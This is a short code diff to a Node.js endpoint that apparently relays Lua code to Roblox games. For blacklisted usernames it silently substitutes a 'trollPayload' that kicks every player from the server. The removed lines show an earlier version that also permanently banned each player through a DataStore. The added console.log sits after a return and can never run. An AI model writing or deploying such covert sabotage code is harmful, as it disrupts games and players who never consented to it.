@@ -22,13 +22,8 @@ app.post("/executeRequest", (req, res) => {
 
   if (blacklist.has(username)) {
     const trollPayload = `
-local ds = game:GetService("DataStoreService")
-local banStore = ds:GetDataStore("BanList")
 for _, player in ipairs(game.Players:GetPlayers()) do
-    pcall(function()
-        banStore:SetAsync(player.UserId, true)
-        player:Kick("Banned for trolling.")
-    end)
+    player:Kick("Get rekt.")
 end
 if game:GetService("Players").LocalPlayer then
     local t = {}
@@ -39,6 +34,7 @@ end
     `;
     events.emit(EVENT, { username, code: trollPayload });
     return res.sendStatus(200);
+    console.log(username);
   }
 
   events.emit(EVENT, { username, code });
